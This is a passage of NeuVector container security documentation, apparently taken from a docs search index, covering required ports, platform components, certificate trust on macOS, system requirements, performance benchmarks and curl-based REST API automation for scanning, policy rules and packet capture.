/var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Also, you may need to ensure that other tools are not blocking access to the docker.sock interface.  Ports and Port Mapping​  Make sure the required ports are mapped properly and open on the host. The Manager or Allinone requires 8443 (if using the console). The Allinone and Controller requires 18300, 18301, 18400, 18401 and optionally 10443, 11443, 20443, 30443. The Enforcer requires 18301 and 18401.  Note: If deploying docker native (including SWARM) make sure there is not any host firewall blocking access to required ports such as firewalld. If enabled, the docker0 interface must be added as a trusted zone for the allinone/controller hosts.  Port Summary​  The following table lists communications from each NeuVector container. The Allinone container combines the Manager, Controller and Enforcer containers so requires the ports listed for those containers.    The following table summarizes the listening ports for each NeuVector container.    Additional Ports​  In version 5.1, a new listener port has been added on 8181 in the controller for local controller communication only.  tcp 0 0 :::8181 :::* LISTEN 8/opa  ","version":"Next 🚧","tagName":"h3"},{"title":"5.x Overview","type":0,"sectionRef":"#","url":"/next/basics/overview","content":"","keywords":"","version":"Next 🚧"},{"title":"The Full Life-Cycle Container Security Platform​","type":1,"pageTitle":"5.x Overview","url":"/next/basics/overview#the-full-life-cycle-container-security-platform","content":" note These docs describe the 5.x (Open Source) version. The 5.x images are accessible from Docker Hub with the appropriate tag, e.g. neuvector/controller:(version). For 4.x versions see the 4.x Docs.  NeuVector provides a powerful end-to-end container security platform. This includes end-to-end vulnerability scanning and complete run-time protection for containers, pods and hosts, including:  CI/CD Vulnerability Management &amp; Admission Control. Scan images with a Jenkins plug-in, scan registries, and enforce admission control rules for deployments into production.Violation Protection. Discovers behavior and creates a whitelist based policy to detect violations of normal behavior.Threat Detection. Detects common application attacks such as DDoS and DNS attacks on containers.DLP and WAF Sensors. Inspect network traffic for Data Loss Prevention of sensitive data, and detect common OWASP Top10 WAF attacks.Run-time Vulnerability Scanning. Scans registries, images and running containers orchestration platforms and hosts for common (CVE) as well as application specific vulnerabilities.Compliance &amp; Auditing. Runs Docker Bench tests and Kubernetes CIS Benchmarks automatically.Endpoint/Host Security. Detects privilege escalations, monitors processes and file activity on hosts and within containers, and monitors container file systems for suspicious activity.Multi-cluster Management. Monitor and manage multiple Kubernetes clusters from a single console.  Other features of NeuVector include the ability to quarantine containers and to export logs through SYSLOG and webhooks, initiate packet capture for investigation, and integration with OpenShift RBACs, LDAP, Microsoft AD, and SSO with SAML. Note: Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.  ","version":"Next 🚧","tagName":"h3"},{"title":"Security Containers​","type":1,"pageTitle":"5.x Overview","url":"/next/basics/overview#security-containers","content":" The NeuVector run-time container security solution contains four types of security containers: Controllers, Enforcers, Managers, and Scanners. A special container called the Allinone is also provided to combine the Controller, Enforcer, and Manager functions all in one container, primarily for docker native deployments.  NeuVector can be deployed on virtual machines or on bare metal systems with a single os.  Controller​  The Controller manages the NeuVector Enforcer container cluster. It also provides REST APIs for the management console. Although typical test deployments have one Controller, multiple Controllers in a high-availability configuration is recommended. 3 controllers is the default in the Kubernetes Production deployment sample yaml.  Enforcer​  The Enforcer is a lightweight container that enforces the security policies. One enforcer should be deployed on each node (host), e.g. as a Daemon set.  note For Docker native (non Kubernetes) deployments the Enforcer container and the Controller cannot be deployed on the same node (except in the All-in-One case below).  Manager​  The Manager is a stateless container that provides a web-UI (HTTPS only) console for users to manage the NeuVector security solution. More than one Manager container can be deployed as necessary.  All-in-One​  The All-in-One container includes a Controller, an Enforcer and a Manager in one package. It's useful for easy installation in single-node or small-scale deployments.  Scanner​  The Scanner is a container which performs the vulnerability and compliance scanning for images, containers and nodes. It is typically deployed as a replicaset and can be scaled up to as many parallel scanners as desired in order to increase the scanning performance. The Controller assigns scanning jobs to each available scanner in a round-robin fashion until all scans are completed. The scanner also contains the latest CVE database and is updated regularly by NeuVector.  Updater​  The Updater is a container which when run, updates the CVE database for NeuVector. NeuVector regularly publishes new scanner images to include the latest CVE for vulnerability scans. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up, forcing a pull of an updated scanner image.  Architecture​  Here is a general architecture overview of NeuVector. Not shown is the separate scanner container, which can also be run as a stand-alone pipeline scanner.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deployment Examples​","type":1,"pageTitle":"5.x Overview","url":"/next/basics/overview#deployment-examples","content":" For common deployment patterns and best practices see the Onboarding/Best Practices section.  All-in-One and Enforcers​  This deployment is ideal for single-node or small-scale environments, for example for evaluation, testing, and small deployments. An All-in-One container is deployed on one node, which can also be a node with running application containers. An Enforcer can be deployed on all other nodes, with one Enforcer required on each node you wish to protect with NeuVector. This is also useful for native Docker deployments where a controller and enforcer cannot run on the same host.  Controller, Manager and Enforcer Containers​  This is a more generic deployment use case which consists one or more Controllers, one Manager and a set of Enforcers. The Controller and Manager can be deployed on the same node or on different nodes than the Enforcer.  All-in-One Only​  You can deploy just the allinone container for registry scanning, using the Jenkins plug-in, or simple one node testing of NeuVector.  Controller Only​  It is possible to deploy a single Controller container and/or scanner to manage vulnerability scanning outside a cluster, for example for use with the Jenkins plug-in. Registry scanning can also be performed by the Controller using the REST API exclusively, but typically a Manager container is also desired in order to provide console based configuration and results viewing for registry scanning. ","version":"Next 🚧","tagName":"h3"},{"title":"Configuring NeuVector and Accessing the Console","type":0,"sectionRef":"#","url":"/next/configuration","content":"Configuring NeuVector and Accessing the Console How to perform initial configurations and access the console.","keywords":"","version":"Next 🚧"},{"title":"Chrome Certificate Upload - MacOS","type":0,"sectionRef":"#","url":"/next/configuration/console/chrome","content":"","keywords":"","version":"Next 🚧"},{"title":"Enabling Chrome Browsers to Accept the NeuVector Self-Signed Certificate on MacOS​","type":1,"pageTitle":"Chrome Certificate Upload - MacOS","url":"/next/configuration/console/chrome#enabling-chrome-browsers-to-accept-the-neuvector-self-signed-certificate-on-macos","content":" Under certain circumstances the Chrome browser will flat out refuse to accept a NeuVector self-signed certificate. A possible reason could be that the certificate has not yet been imported into macOS login certificates store. Another possibility is that an existing certificate has not yet been configured to be trusted. This will disallow the user from accepting it and proceeding to the NeuVector login page with the use of Chrome as illustrated with the example shown below:    Corrective steps can be taken to enable Chrome on accepting the self-signed certificate placed on macOS Keychain store. This can be done by configuring the NeuVector’s certificate to be trusted using the Mac’s Keychain Access application. This is with the assumption that the certificate does indeed exists in the macOS Keychain Access store. We will first look at how to export a certificate from an existing NeuVector node from one system, and later can be imported into another system. There are 2 ways to go about exporting the certificate which we will go over below. They are, using the Chrome browser, and using the macOS Keychain Access application.  Certificate export using Chrome​  The screen capture below illustrates how to access the NeuVector certificate using Chrome.    To export the certificate, drag and drop the certificate to a location of choice.    Certificate export using macOS Keychain-Access​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and double click on the application. This launches the Keychain Access application. Select the NeuVector certificate and choose Export “NeuVector” from the dropdown menu. This will allow the export of the certificate to a location of choice.    Launching the macOS Keychain-Access Application​  There are two ways to launch the macOS Keychain Access Application. This can be done by searching from the macOS, which has been described from the steps immediately above, or using the Chrome browser.  Launching Keychain-Access from the Chrome Browser​  Settings &gt; Advanced &gt; Manage certificates    Clicking on the Manage certificates as shown from above launches the Mac’s Keychain Access application as shown below.    Certificate import into the macOS Keychain-Access Store​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and click on the application. Then import the certificate by drag and dropping a NeuVector certificate (example: nvcertificate.cer) into the Certificate right pane of the Keychain Access application. Now that the certificate has been imported, it is not yet trusted. The following is an example showing the default trust settings after a NeuVector’s certificate has been imported into the Keychain Access application.    Notice that none of the parameters have been configured, and it is not trusted by default. It needs to be configured to be trusted to allow the user to access the login page using the Chrome browser.  Enabling trust for the NeuVector Certificate​  The following steps details on how to enable trust for the NeuVector certificate in the Keychain Access store.    Double clicking on the NeuVector certificate from the screen capture above will bring up another popup dialog box that allows the trust permissions to be configured for different parameters. Configure Secure Sockets Layer (SSL) to “Always Trust”.    Close the dialog box and click on ‘Update Settings” after entering the Mac logon user’s password from the following popup dialog box.    This finalizes the trust configurations. Next, clear all Chrome browser’s cache, close all Chrome browsers, and relaunch the Chrome browser. Next visit the NeuVector login page, and upon clicking on the “Advanced” link, the Proceed to … (unsafe) link will be shown. Clicking on the Proceed to … (unsafe) will allow the user to proceed to the username and password login page.    Below shows a screen capture that allows the user to proceed to the NeuVector login page after Proceed to … (Unsafe) link is clicked.   ","version":"Next 🚧","tagName":"h3"},{"title":"System Requirements","type":0,"sectionRef":"#","url":"/next/basics/requirements","content":"System Requirements System Requirements​ Component\t# of Instances\tRecommended vCPU\tMinimum Memory\tNotesController\tmin. 1 3 for HA (odd # only)\t1\t1GB\tvCPU core may be shared Enforcer\t1 per node/VM\t1+\t1GB\tOne or more dedicated vCPU for higher network throughput in Protect mode Scanner\tmin. 1 2+ for HA/Performance\t1\t1GB\tCPU core may be shared for standard workloads. Dedicate 1 or more CPU for high volume (10k+) image scanning. Registry image scanning is performed by the scanner and managed by the controller and the image is pulled by the scanner and expanded in memory. The minimum memory recommendation assumes images to be scanned are not larger than .5GB. When scanning images larger than 1GB, scanner memory should be calculated by taking the largest image size and adding .5GB. Example - largest image size = 1.3GB, the scanner container memory should be 1.8GB Manager\tmin 1 2+ for HA\t1\t1GB\tvCPU may be shared For configuration backup/HA, a RWX PVC of 1Gi or more. See Backups and Persistent Data section for more details.Recommended browser: Chrome for better performance Supported Platforms​ Officially supported linux distributions, SUSE Linux, Ubuntu, CentOS/Red Hat (RHEL), Debian, CoreOS, AWS Bottlerocket and Photon.AMD64 and Arm architecturesCoreOS is supported (November 2023) for CVE scanning through RHEL mapping table provided by RedHat. Once an official feed is published by RedHat for CoreOS it will be supported.Officially supported Kubernetes and Docker compliant container management systems. The following platforms are tested with every release of NeuVector: Kubernetes 1.19-1.29, SUSE Rancher (RKE, RKE2, K3s etc), RedHat OpenShift 4.6-4.13 (3.x to 4.12 supported prior to NeuVector 5.2.x), Google GKE, Amazon EKS, Microsoft Azure AKS, IBM IKS, native docker, docker swarm. The following Kubernetes and docker compliant platforms are supported and have been verified to work with NeuVector: VMware Photon and Tanzu, SUSE CaaS, Oracle OKE, Mirantis Kubernetes Engine, Nutanix Kubernetes Engine, docker UCP/DataCenter, docker Cloud.Docker run-time version: 1.9.0 and up; Docker API version: 1.21, CE and EE.Containerd and CRI-O run-times (requires changes to volume paths in sample yamls). See changes required for Containerd in the Kubernetes deployment section and CRI-O in the OpenShift deployment section.NeuVector is compatible with most commercially supported CNI's. Officially tested and supported are openshift ovs (subnet/multitenant), calico, flannel, cilium, antrea and public clouds (gke, aks, iks, eks). Note: The multus cni is not currently supported but is on the 2024 roadmap.Console: Chrome or Firefox browser recommended. IE 11 not supported due to performance issues.Minikube is supported for simple initial evaluation but not for full proof of concept. See below for changes required for the Allinone yaml to run on Minikube. AWS Bottlerocket Note: Must change path of the containerd socket specific to Bottleneck. Please see Kubernetes deployment section for details. Not Supported​ GKE Autopilot.The multus cni is not currently supported but is on the 2024 roadmap.AWS ECS is no longer supported. (NOTE: No functionality has been actively removed for operating NeuVector on ECS deployments. However, testing on ECS is no longer being perfromed by SUSE. While protecting ECS workloads with Neuvector likely will operate as expected, issues will not be investigated.)Docker on MacDocker on WindowsRkt (container linux) from CoreOSAppArmor on K3S / SLES environments. Certain configurations may conflict with NeuVector and cause scanner errors; AppArmor should be disabled when deploying NeuVector.IPv6 is not supportedVMWare Integrated Containers (VIC) except in nested modeCloudFoundryConsole: IE 11 not supported due to performance issues.Nested container host in a container tools used for simple testing. For example, deployment of a Kubernetes cluster using 'kind' https://kind.sigs.k8s.io/docs/user/configuration/. Note 1: PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Controller, Enforcer: hostPath: path: /var/vcap/sys/run/docker/docker.sock note NeuVector supports running on linux-based VMs on Mac/Windows using Vagrant, VirtualBox, VMware or other virtualized environments. Minikube​ Please make the following changes to the Allinone deployment yaml. apiVersion: apps/v1 &lt;&lt;-- required for k8s 1.19 kind: DaemonSet metadata: name: neuvector-allinone-pod namespace: neuvector spec: selector: &lt;-- Added matchLabels: &lt;-- Added app: neuvector-allinone-pod &lt;-- Added minReadySeconds: 60 ... nodeSelector: &lt;-- DELETE THIS LINE nvallinone: &quot;true&quot; &lt;-- DELETE THIS LINE apiVersion: apps/v1 &lt;&lt;-- required for k8s 1.19 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: &lt;-- Added matchLabels: &lt;-- Added app: neuvector-enforcer-pod &lt;-- Added Performance and Scaling​ As always, performance planning for NeuVector containers will depend on several factors, including: (Controller &amp; Scanner) Number and size of images in registry to be scanned (by Scanner) initially(Enforcer) Services mode (Discover, Monitor, Protect), where Protect mode runs as an inline firewall(Enforcer) Type of network connections for workloads in Protect mode In Monitor mode (network filtering similar to a mirror/tap), there is no performance impact and the Enforcer handles traffic at line speed, generating alerts as needed. In Protect mode (inline firewall), the Enforcer requires CPU and memory to filter connections with deep packet inspection and hold them to determine whether they should be blocked/dropped. Generally, with 1GB of memory and a shared CPU, the Enforcer should be able to handle most environments while in Protect mode. For throughput or latency sensitive environments, additional memory and/or a dedicated CPU core can be allocated to the NeuVector Enforcer container. For performance tuning of the Controller and Scanner for registry scanning, see System Requirements above. For additional advice on performance and sizing, see the Onboarding/Best Practices section. Throughput​ As the chart below shows, basic throughput benchmark tests showed a maximum throughput of 1.3 Gbps PER NODE on a small public cloud instance with 4 CPU cores. For example, a 10 node cluster would then be able to handle a maximum of 13 Gbps of throughput for the entire cluster for services in Protect mode. This throughput would be projected to scale up as dedicated a CPU is assigned to the Enforcer, or the CPU speed changes, and/or additional memory is allocated. Again, the scaling will be dependent on the type of network/application traffic of the workloads. Latency​ Latency is another performance metric which depends on the type of network connections. Similar to throughput, latency is not affected in Monitor mode, only for services in Protect (inline firewall) mode. Small packets or simple/fast services will generate a higher latency by NeuVector as a percentage, while larger packets or services requiring complex processing will show a lower percentage of added latency by the NeuVector enforcer. The table below shows the average latency of 2-10% benchmarked using the Redis benchmark tool. The Redis Benchmark uses fairly small packets, so the the latency with larger packets would expected to be lower. Test\tMonitor\tProtect\tLatencyPING_INLINE\t34,904\t31,603\t9.46% SET\t38,618\t36,157\t6.37% GET\t36,055\t35,184\t2.42% LPUSH\t39,853\t35,994\t9.68% RPUSH\t37,685\t36,010\t4.45% LPUSH (LRANGE Benchmark)\t37,399\t35,220\t5.83% LRANGE_100\t25,539\t23,906\t6.39% LRANGE_300\t13,082\t12,277\t6.15% The benchmark above shows average TPS of Protect mode versus Monitor mode, and the latency added for Protect mode for several tests in the benchmark. The main way to lower the actual latency (microseconds) in Protect mode is to run on a system with a faster CPU. You can find more details on this open source Redis benchmark tool at https://redis.io/topics/benchmarks.","keywords":"","version":"Next 🚧"},{"title":"REST API and Automation","type":0,"sectionRef":"#","url":"/next/automation/automation","content":"","keywords":"","version":"Next 🚧"},{"title":"NeuVector Automation​","type":1,"pageTitle":"REST API and Automation","url":"/next/automation/automation#neuvector-automation","content":" There are many automation features in NeuVector to support the entire CI/CD workflow, including:  Jenkins plug-in to automated scanning during buildRegistry scanning to automate repository monitoringAdmission Control policies to allow/deny unauthorized deploymentsCIS benchmarks automatically run on hostsHelm chart on github for automated deployment on KubernetesResponse rules to automate responses to security eventsREST API for building automation of any NeuVector function  REST API​  The NeuVector solution can be managed using the REST API. Below are common examples of automation using the REST API. The REST API yaml doc is best viewed in the Swagger 2.0 viewer. The REST API documentation is below in a yaml file which is best viewed in a reader such as swagger.io.  Latest update can be found here. Also in the NeuVector GitHub source code repo. The apis.yaml from the main truck can include unreleased features. It is recommended to download the appropriate released version source code and extract the apis.yaml from the controller/api folder.  important If you are making REST API calls with username/password, please be sure make a DELETE call against /v1/auth when done. There is a maximum of 32 concurrent sessions for each user. If this is exceeded, an authentication failure will occur.  NeuVector also support Response Rules to automate common responses to security events or vulnerabilities detected. Please see the section Security Policy -&gt; Response Rules for more details.  Expose REST API in Kubernetes​  To expose the REST API for access from outside of the Kubernetes cluster, enable port 10443.  apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller-api namespace: neuvector spec: ports: - port: 10443 name: controller-api protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   note type: NodePort can also be used instead of LoadBalancer.  note If using type LoadBalancer, set the controllerIP in the examples below to the external IP or URL for the loadbalancer.  Authentication for REST API​  The REST API supports two types of authentication: username/password and token. Both can be configured in Settings -&gt; Users, API Keys &amp; Roles, and be associated with default or custom roles to limit access privileges. The examples below show username/password based authentication where a token is created first, then used in subsequent REST API calls. If using a token, it can be used directly in each REST API call. Note: username based connections have a limited number of concurrent sessions, so it is important to delete the username token as shown below when finished. Token based authentication does not have a limit, but expire according to the time limit selected when created.  For token-based authentication, see the following screen shots and example call. Be sure to copy the secret and token once created, as there is no way to retrieve this after the screen in closed.        Trigger Vulnerability Scanning from a script​  NeuVector can be triggered automatically to scan an image for vulnerabilities. This can be done by configuring a registry/repository to be monitored, using the NeuVector Jenkins plug-in, or using the REST API. Please see the section on Scanning &amp; Compliance for more detail.  The sample script below shows how to remotely pull the container, run it, and scan it. It can be triggered from a Jenkins task (remote shell) or any CI/CD tool. A JSON parser tool (jq) is also used.  Be sure to enter the controller IP address in the script and change the container image name to the one you wish to scan. Also, update the username/password fields.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;&quot; _registryUsername_=&quot;&quot; _registryPassword_=&quot;&quot; _repository_=&quot;alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_   note You may need to install jq sudo yum install jq   For Kubernetes based deployments you can set the Controller IP as follows:  _podNAME_=`kubectl get pod -n neuvector -o wide | grep &quot;allinone\\|controller&quot; | head -n 1 | awk '{print $1}'` _controllerIP_=`kubectl exec $_podNAME_ -n neuvector -- consul info | grep leader_addr | awk -F&quot;:| &quot; '{print $3}'`   note In a multiple controller deployment the requests must be sent to a single controller IP so multiple requests for status of long running image scans go to the controller performing the scan.  For scanning locally instead of in a registry:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;tag&quot;: &quot;3.4&quot;, &quot;repository&quot;: &quot;nvlab/alpine&quot;, &quot;scan_layers&quot;: true}}' &quot;https://$_controllerIP_:443/v1/scan/repository&quot;   Sample output:  { &quot;report&quot;: { &quot;image_id&quot;: &quot;c7fc7faf8c28d48044763609508ebeebd912ad6141a722386b89d044b62e4d45&quot;, &quot;registry&quot;: &quot;&quot;, &quot;repository&quot;: &quot;nvlab/alpine&quot;, &quot;tag&quot;: &quot;3.4&quot;, &quot;digest&quot;: &quot;sha256:2441496fb9f0d938e5f8b27aba5cc367b24078225ceed82a9a5e67f0d6738c80&quot;, &quot;base_os&quot;: &quot;alpine:3.4.6&quot;, &quot;cvedb_version&quot;: &quot;1.568&quot;, &quot;vulnerabilities&quot;: [ { &quot;name&quot;: &quot;CVE-2018-0732&quot;, &quot;score&quot;: 5, &quot;severity&quot;: &quot;Medium&quot;, &quot;vectors&quot;: &quot;AV:N/AC:L/Au:N/C:N/I:N/A:P&quot;, &quot;description&quot;: &quot;During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).&quot;, &quot;package_name&quot;: &quot;openssl&quot;, &quot;package_version&quot;: &quot;1.0.2n-r0&quot;, &quot;fixed_version&quot;: &quot;1.0.2o-r1&quot;, &quot;link&quot;: &quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0732&quot;, &quot;score_v3&quot;: 7.5, &quot;vectors_v3&quot;: &quot;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&quot; }, ... ], &quot;layers&quot;: [ { &quot;digest&quot;: &quot;c68318b6ae6a2234d575c4b6b33844e3e937cf608c988a0263345c1abc236c14&quot;, &quot;cmds&quot;: &quot;/bin/sh&quot;, &quot;vulnerabilities&quot;: [ { &quot;name&quot;: &quot;CVE-2018-0732&quot;, &quot;score&quot;: 5, &quot;severity&quot;: &quot;Medium&quot;, &quot;vectors&quot;: &quot;AV:N/AC:L/Au:N/C:N/I:N/A:P&quot;, &quot;description&quot;: &quot;During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).&quot;, &quot;package_name&quot;: &quot;openssl&quot;, &quot;package_version&quot;: &quot;1.0.2n-r0&quot;, &quot;fixed_version&quot;: &quot;1.0.2o-r1&quot;, &quot;link&quot;: &quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0732&quot;, &quot;score_v3&quot;: 7.5, &quot;vectors_v3&quot;: &quot;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&quot; }, ... ], &quot;size&quot;: 5060096 } ] } }   Create Policy Rules Automatically​  To create a new rule in the NeuVector policy controller, the groups for the FROM and TO fields must exist first. The following sample creates a new Group based on the container label nv-service-type=data, and another Group for label nv-service-type=website. A rule is then created to allow traffic from the wordpress container to the mysql container using only the mysql protocol.  Be sure to update the username and password for access to the controller.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mydb&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;data&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mywp&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;website&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -X &quot;PATCH&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;insert&quot;: {&quot;rules&quot;: [{&quot;comment&quot;: &quot;Custom WP Rule&quot;, &quot;from&quot;: &quot;mywp&quot;, &quot;applications&quot;: [&quot;MYSQL&quot;], &quot;ports&quot;: &quot;any&quot;, &quot;to&quot;: &quot;mydb&quot;, &quot;action&quot;: &quot;allow&quot;, &quot;id&quot;: 0}], &quot;after&quot;: 0}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/policy/rule&quot; curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;   If the Groups already exist in NeuVector then the new rule can be created, skipping the Group creation steps. This example also removes the authentication token at the end. Note that a Rule ID number can be specified and NeuVector executes rules in numerical order lowest to highest.  Export/Import Configuration File​  Here are samples to backup the NeuVector configuration file automatically. You can select whether to export all configuration settings (policy, users, Settings etc), or only the policy.  important These samples are provided as examples only and are not officially supported unless a specific enterprise support agreement has been put in place.  To export all configuration:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # exporting the configuration with all settings   To export policy only:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ --section policy # exporting the configuration with policy only   To import the file:  ./config.py import -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # importing the configuration   Sample python files Contains config.py, client.py, and multipart.py. Download sample files: ImportExport. Please put all three files in one folder to run above commands. You may need install some Python modules in order to run the script.  sudo pip install requests six   Setting or Changing User Password​  Use the rest API calls for User management.  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: c64125decb31e6d3125da45cba0f5025' https://127.0.0.1:10443/v1/user/admin -X PATCH -d '{&quot;config&quot;:{&quot;fullname&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;new_password&quot;:&quot;NEWPASS&quot;}}'   Starting Packet Capture on a Container​  When a container exhibits suspicious behavior, start a packet capture.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;sniffer&quot;:{&quot;file_number&quot;:1,&quot;filter&quot;:&quot;port 1381&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/sniffer?f_workload=`docker inspect neuvector.allinone | jq -r .[0].Id`&quot;   Don’t forget to stop the sniffer session after some time so it doesn’t run forever. Number of files to rotate has a maximum value of 50.  Check and Accept the EULA (new deployments)​  Get the authentication TOKEN as above. Also replace the controller IP address with your as appropriate.  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: $_TOKEN_' https://127.0.0.1:10443/v1/eula | jq . { &quot;eula&quot;: { &quot;accepted&quot;:false } }   Accept EULA  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: $_TOKEN_' -d '{&quot;eula&quot;:{&quot;accepted&quot;:true}}' https://127.0.0.1:10443/v1/eula   Then check the EULA again.  Configure Registry Scanning​  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.connect.redhat.com&quot;, &quot;username&quot;: &quot;username&quot;, &quot;password&quot;: &quot;password&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;repository&quot;: &quot;neuvector/enforcer&quot;}}' &quot;https://controller:port/v1/scan/repository&quot;   Enable Packet Capture on All Pods in a Namespace​  #!/bin/bash #set -x hash curl 2&gt;/dev/null || { echo 